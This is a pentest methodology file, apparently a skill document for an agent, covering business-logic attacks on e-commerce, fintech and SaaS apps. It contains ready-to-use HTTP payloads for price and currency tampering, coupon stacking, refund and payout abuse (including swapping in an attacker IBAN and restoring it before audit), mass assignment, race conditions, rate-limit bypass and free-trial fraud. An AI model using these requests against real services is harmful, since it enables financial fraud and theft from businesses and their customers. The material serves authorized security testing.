---
name: offensive-business-logic
description: Business logic vulnerability testing for web/mobile/API engagements.
  Covers workflow bypass, state machine violations, multi-step process abuse, price/quantity/discount
  manipulation, currency confusion, coupon stacking, refund/chargeback abuse, race
  conditions on logic boundaries, parameter tampering for hidden flows, role/tenant
  boundary violations, time-of-check vs use, anti-automation defeat, fraud-detection
  evasion, and subscription/quota abuse. Use when scoping an application after surface-level
  OWASP Top 10 has been covered, or when the asset is a transactional/marketplace/fintech/e-commerce/SaaS
  app where logic flaws produce direct financial impact.
---

# Business Logic — Offensive Testing Methodology

Business logic flaws are the highest-paying class of vulnerability for bug bounty and the hardest for scanners to detect. They live in the gap between what the developer specified and what an attacker can convince the system to accept.

## Quick Workflow

1. Map every multi-step flow as a state machine (states + allowed transitions + side effects)
2. For each transition, ask: who can call it, in what state, with what inputs, how many times
3. Probe each axis (state, identity, input, frequency) for assumptions
4. Combine flaws — single-axis flaws are usually low severity; chains are critical
5. Quantify financial impact per finding (loss-per-attack × scale)

---

## Reconnaissance — Mapping the Logic

### Build the State Machine

For each user flow, draw:
- **States**: cart, pending payment, paid, shipped, refunded, cancelled
- **Transitions**: which API/UI action, which role, which preconditions
- **Side effects**: balance change, inventory change, email, webhook

Look for transitions that:
- Skip intermediate states (`cart` → `shipped` without `paid`)
- Are reversible when they shouldn't be (`shipped` → `cart`)
- Trigger side effects more than once
- Allow cross-role invocation

### Hidden / Internal Endpoints

```bash
# Compare authenticated and unauthenticated JS bundles for buried admin routes
diff <(curl https://app/main.js) <(curl -H "Cookie: ..." https://app/main.js)

# Look for flag/feature toggles that change UI but not server-side enforcement
grep -E '(isAdmin|isInternal|featureFlag|debug)' bundle.js

# API spec (OpenAPI/Swagger) often lists endpoints the UI never calls
curl https://app/api/openapi.json | jq '.paths | keys'
```

---

## Workflow / State-Machine Bypass

### Skip a Required Step

```http
# Normal flow: /verify-email → /set-password → /enable-2fa → /dashboard
# Try jumping directly:
GET /dashboard
GET /api/account/details
POST /api/payout-settings
```

```http
# Checkout flow: /cart → /address → /shipping → /payment → /confirm
# Skip /payment by replaying /confirm with a previous order's payment-token reference:
POST /api/order/confirm
{ "cartId": "current", "paymentRef": "<old-paid-order-payment-ref>" }
```

### Replay a One-Time Action

```http
# Refund endpoint without idempotency
POST /api/orders/123/refund   # First call: $50 refunded, order marked refunded
POST /api/orders/123/refund   # Second call: server checks "is order refunded?" — race the check (see TOCTOU)
```

### State Downgrade

Move a finalized object back to an editable state where mutations have effect:

```http
PUT /api/order/123
{ "status": "draft" }   # If accepted, you can now edit the price field
PUT /api/order/123
{ "items": [{ "id": "tv", "price": 1 }] }
```

### Direct Endpoint Invocation

Many admin/backend transitions are reachable from any authenticated user if route-level RBAC is missing while the UI hides them.

```bash
# Enumerate verbs on every discovered path
for path in $(cat paths.txt); do
  for v in GET POST PUT PATCH DELETE OPTIONS; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X $v -H "Authorization: Bearer $T" https://app$path)
    echo "$v $path $code"
  done
done | grep -v -E ' (401|403|404) '
```

---

## Price / Quantity / Currency Manipulation

### Negative / Zero / Float Quantities

```http
POST /api/cart/add
{ "sku": "tv", "qty": -1 }      # Refund issued for adding negative items?
{ "sku": "tv", "qty": 0.0001 }  # Float rounding: $0 line item, full product shipped?
{ "sku": "tv", "qty": 9e99 }    # Overflow → wraps to small number, $0 cost?
```

### Hidden Price Fields

```http
POST /api/checkout
{ "items": [{"sku":"tv","qty":1,"price":1}], "total": 1, "tax": 0, "shipping": 0 }
```

If the server trusts client-supplied `price`, you set the price. Test every numeric field — `price`, `total`, `discount`, `tax`, `shipping`, `subtotal`, `currency`.

### Currency Confusion

```http
POST /api/checkout
{ "amount": 100, "currency": "JPY" }   # Pay 100 JPY (~$0.65) for $100 USD product?
{ "amount": 100, "currency": "VND" }   # Even better
{ "amount": 100, "currency": "BTC" }   # Or worse: pay in BTC at $1 BTC = $1?
```

Look for: missing currency normalization, sloppy FX rate caching, currency lookup by user input.

### Coupon / Discount Logic

```http
# Apply same coupon multiple times
POST /api/cart/coupon { "code": "SAVE50" }
POST /api/cart/coupon { "code": "SAVE50" }   # Stacks?
POST /api/cart/coupon { "code": "save50" }   # Case sensitivity gives second slot?
POST /api/cart/coupon { "code": "SAVE50 " }  # Whitespace ditto?

# Coupon for a different product
POST /api/cart/apply-coupon { "code": "FREEMOUSE", "appliedTo": "macbook" }

# Negative discount (becomes a surcharge that reduces total when coupon stacked with another)
POST /api/admin/coupon { "code": "X", "percent": -50 }   # If admin endpoint reachable

# Expired coupon: change date in payload?
POST /api/cart/coupon { "code": "BLACKFRIDAY", "appliedAt": "2023-11-25T00:00:00Z" }
```

### Cart Tampering

```http
# Add a cheap item, edit the SKU server-side
POST /api/cart/add { "sku": "pen", "qty": 1 }
PUT  /api/cart/items/abc { "sku": "macbook" }      # SKU swap with pen's price retained?
```

---

## Refund / Chargeback / Payout Abuse

### Refund More Than You Paid

```http
POST /api/orders/123/refund { "amount": 99999 }
```

### Refund After Returning Less

Order ships 5 items, you return 1, request refund for full order. Logic should compute refund per returned item; if it computes per *order*, free items.

### Convert Refund to Different Method

```http
POST /api/orders/123/refund { "method": "store-credit" }
# vs original card payment → store credit can be transferred / sold
```

### Payout Account Race

```http
PUT  /api/payout-account { "iban": "ATTACKER" }
POST /api/withdraw { "amount": 1000 }
PUT  /api/payout-account { "iban": "ORIGINAL" }   # Restore before audit
```

---

## Identity / Tenant / Role Boundary

### Role Confusion via Multipart / Parameter Pollution

```http
POST /api/users/me
role=user&role=admin              # Last-wins parser → admin
{"role": "user", "role": "admin"} # JSON last-wins
```

### Tenant ID Substitution in Hidden Field

```http
POST /api/invoices
{ "amount": 100, "tenantId": "victim-corp", "billTo": "attacker" }
# Charges victim-corp for attacker's order
```

### Mass Assignment / Field Whitelist

```http
PUT /api/users/me
{ "email": "x@y.com", "isAdmin": true, "credits": 10000, "tenantId": "victim" }
```

Test every field that exists on the model, not just those the form exposes.

### Indirect Privilege via Object Linking

```http
POST /api/projects/PUBLIC-PROJECT/share-token   # Anyone can mint
GET  /api/projects/PUBLIC-PROJECT/internal-only-data?token=...
# Sharing API meant for collaborators bypasses role check on data API
```

---

## Race Conditions on Logic Boundaries

Logic checks that read state, then act on state, are TOCTOU-vulnerable. (Also see: `offensive-toctou`, `offensive-race-condition`.)

### Single-Packet Multi-Request

```python
# Burp Repeater "Send group in parallel (single-packet attack)" — HTTP/2 over TLS,
# all requests' last frames sent in one TCP segment. Server processes them concurrently.
```

### Common Logic Races

| Flow | Race |
|------|------|
| Coupon redemption | N parallel `apply-coupon` calls each see "unused" |
| 2FA verification | Submit code N times in parallel before lockout counter increments |
| Withdrawal | Parallel withdraws each see full balance |
| Vote / Like / Reaction | "One per user" check raced |
| Invitation acceptance | Multiple accepts → multiple seats granted |
| Free-trial signup | Parallel signups → multiple trials per email |
| Gift-card redeem | Parallel redeems → multi-spend a single card |
| Inventory reservation | Parallel buys of last item → oversell, supplier covers difference |

### Amplification

```python
# Send 30 parallel "redeem $10 gift card" requests, all see balance = $10
# Result: $300 credited from a $10 card
```

---

## Anti-Automation / Fraud Defeat

### Captcha / Rate Limit Bypass

| Bypass | Mechanic |
|--------|----------|
| Token reuse | One captcha solve, replay token across many requests |
| Endpoint mirror | `/api/v1/login` rate-limited, `/api/v2/login` not |
| Header rotation | `X-Forwarded-For: <random>` resets per-IP counter |
| HTTP/2 stream multiplexing | Each stream counted as same conn → window only |
| Method/case variation | `POST /Login` vs `POST /login` keyed differently in cache |

### Device Fingerprint / Velocity

- New device → require step-up auth. Replay captured device cookies / FingerprintJS hash.
- Velocity counters (5 logins/hour) often per `(userid, ip)` not per `userid`.
- Risk score thresholds: small purchases skip review. Test the boundary ($99.99 vs $100).

### Free Trial / Sign-Up Abuse

```http
# Email aliasing
attacker+1@gmail.com, attacker+2@gmail.com         # Plus-aliasing
attacker.@gmail.com, a.t.t.acker@gmail.com         # Dots ignored on Gmail
attacker@googlemail.com                            # gmail/googlemail equivalence

# Phone number recycling (number-portable VOIP) — identity not unique
# Device-ID rotation (mobile testing) — wipe storage, new install
```

### Referral / Reward Loops

```http
POST /api/refer { "email": "a@x.com" }   # +$5 to me when they sign up
# Sign up the alias, receive referral
POST /api/refer { "email": "a+1@x.com" }  # Repeat — many sign-ups, all same person
```

---

## Subscription / Quota / Tier Abuse

### Tier Downgrade Retains Premium Features

```http
PUT /api/subscription { "tier": "free" }   # Cancel paid
GET /api/feature/premium-export             # Still works because feature flag cached?
```

### Mid-Cycle Quota Reset

```http
PUT /api/subscription { "tier": "pro" }   # +1000 quota
PUT /api/subscription { "tier": "free" }  # Resets to 0? Or just caps display?
PUT /api/subscription { "tier": "pro" }   # +1000 again — net 2000 in one cycle
```

### Add-On Stacking

```http
POST /api/addons { "id": "extra-storage" }   # +10GB
POST /api/addons { "id": "extra-storage" }   # Stacks to 20GB?
POST /api/addons { "id": "extra-storage" }   # Or charges once, stacks N times?
```

---

## Time-Based Logic

### Time Travel via Headers

```http
POST /api/checkout
Date: Wed, 01 Jan 2020 00:00:00 GMT      # Server-trusted time?
X-Request-Time: 1577836800
```

### Promotion Window

Set client-side date to inside the window, server validates `X-Promo-Time` parameter. Stale promo cache means yesterday's prices apply today.

### Token / Session Expiry

Refresh token endpoint that doesn't check the original token's expiry → indefinite session extension.

---

## Combining Flaws — Where the Crits Live

Single-axis findings are interesting; **chains** are payouts.

**Example chain (real, paid bounty):**
1. Coupon stacking allows `100% off` × 2 → negative total
2. Negative total → store credit issued (refund of "overpayment")
3. Store credit transferable to gift card
4. Gift card race condition → multiplied
5. Gift card redeemable on partner site for cash equivalents

**Chain template:**
- Find a thing the system gives you (credit, points, slot, seat)
- Find a way to multiply it (race, replay, stacking)
- Find a way to convert it to value (transfer, refund, payout)

---

## Engagement Approach

```
Day 1:  Map state machines for top 3 money flows.
Day 2:  Per state, list what the UI does. Check what the API allows.
Day 3:  Single-axis tests (price tampering, role mass-assignment, replay, currency).
Day 4:  Race conditions on every "one-shot" action.
Day 5:  Chain the findings. Quantify financial impact per chain.
```

Document each finding as: pre-conditions → exact request sequence → state delta → financial impact per execution → scaling factor.

---

## Reporting Hooks

Business-logic findings often get downgraded by triagers who don't understand the chain. Always include:

- A diagram of the intended flow vs. the achieved flow
- A scripted PoC that runs end-to-end (no manual steps)
- A dollar value per execution and a feasibility statement for repeating it
- The fix at the right layer (state machine validator, not just input validation)

---

## Key References

- OWASP WSTG-BUSL — Business Logic Testing chapter
- PortSwigger Web Security Academy: Business logic vulnerabilities track
- MITRE ATT&CK: T1539 (Steal Web Session Cookie), T1078 (Valid Accounts) — for chained access
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/business-logic.md
